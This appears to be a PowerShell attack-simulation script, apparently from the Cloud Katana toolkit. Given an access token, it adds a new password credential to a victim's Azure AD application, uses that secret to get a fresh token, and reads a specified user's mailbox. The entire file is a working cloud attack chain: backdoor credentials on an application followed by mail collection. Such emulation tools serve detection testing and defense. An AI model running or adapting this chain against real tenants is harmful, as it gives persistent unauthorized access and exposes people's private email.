$ErrorActionPreference = "Stop"

function Invoke-NewAADPasswordReadMail {
    <#
    .SYNOPSIS
    A script to add a new password credential to an Azure AD Application to then read Mail from a specific user.

    Author: Roberto Rodriguez (@Cyb3rWard0g)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION
    A script to add a new password credential to an Azure AD Application to then read Mail from a specific user.

    .PARAMETER appClientId
    Client Id of the victim's Azure AD Application.

    .PARAMETER appObjectId
    Object Id of the victim's Azure AD Application.

    .PARAMETER userPrincipalName
    e-mail address to read mailbox messages from

    .PARAMETER accessToken
    Access token used to access the API.

    .LINK
    https://www.powershellgallery.com/packages/CloudKatanaAbilities
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$appClientId,
        
        [Parameter(Mandatory=$true)]
        [string]$appObjectId,

        [Parameter(Mandatory=$true)]
        [string]$userPrincipalName,

        [parameter(Mandatory = $true)]
        [String]$accessToken
    )

    # Step 1
    # Add a new password credential to a victim's AAD Application to get an access token using the new creds and read mail later
    $appPassword = New-CKAzADAppPassword -appObjectId $appObjectId -accessToken $accessToken

    Start-Sleep 30s 
    
    # Step 2
    # Get an access token using the new credentials
    $accessToken = Get-CKAccessToken -ClientId $appClientId -GrantType client_credentials -AppSecret $appPassword.secretText

    # Step 3
    # Read Mailbox messages
    $messages = Get-CKMailboxMessages -userPrincipalName $userPrincipalName -accessToken $accessToken
    $messages
}